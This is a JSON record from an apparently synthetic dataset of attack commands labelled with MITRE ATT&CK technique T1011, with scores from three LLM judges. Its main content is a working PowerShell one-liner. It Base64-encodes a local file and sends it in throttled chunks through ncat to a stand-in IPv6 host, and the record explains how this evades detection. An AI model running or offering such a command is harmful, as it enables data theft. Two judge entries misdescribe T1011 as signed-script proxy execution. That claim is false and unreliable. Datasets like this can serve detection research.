{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); [Text.RegularExpressions.Regex]::Matches($b,'.{1,900}') | ForEach-Object { $_.Value; Start-Sleep -Milliseconds 120 } | ncat.exe -6 2001:db8:dead:beef::27 63999 --send-only",
  "explanation": "Streams Base64 data in throttled chunks over IPv6 TCP to a rarely used high port using ncat. Throttling and IPv6 provide a medium distinct from common exfil channels, consistent with T1011.",
  "rationale_steps": [
    "Chunk and lightly pace Base64 output to reduce traffic spikes.",
    "Send chunks over an IPv6 TCP connection to a high, uncommon port to minimize detection."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-6919b9bb-d261d43c",
  "source_prompt_hash": "6919b9bb",
  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Well-formed PowerShell pipeline with correct quoting, separators, regex usage, and valid ncat arguments.",
        "semantic_score": 3,
        "semantic_justification": "It streams Base64 chunks over IPv6 via ncat as described, but it does not use signed system scripts to proxy execution, so it misaligns with the provided T1011 technique description.",
        "combined_score": 4.0,
        "confidence": 0.8,
        "timestamp": "2025-10-01T21:17:08.779220Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper PowerShell syntax for converting a file to Base64, regex matching, piping, and correct ncat parameter usage.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with T1011 by reading a binary file, encoding it as Base64, breaking it into chunks, and exfiltrating it over IPv6 using ncat to an unusual high port with throttling to avoid detection.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:53:06.935490Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell syntax for variable assignment, .NET method calls, object piping, and the `ncat.exe` invocation with its arguments are all perfectly well-formed and runnable.",
        "semantic_score": 1,
        "semantic_justification": "While the command effectively performs a plausible data exfiltration, it directly executes the exfiltration payload via PowerShell and `ncat.exe`, rather than abusing a trusted or signed system script as a proxy, which is the defining characteristic of MITRE ATT&CK T1011.",
        "combined_score": 3.0,
        "confidence": 0.9,
        "timestamp": "2025-10-02T03:53:18.757901Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.0,
    "llm_average_score": 4.0,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}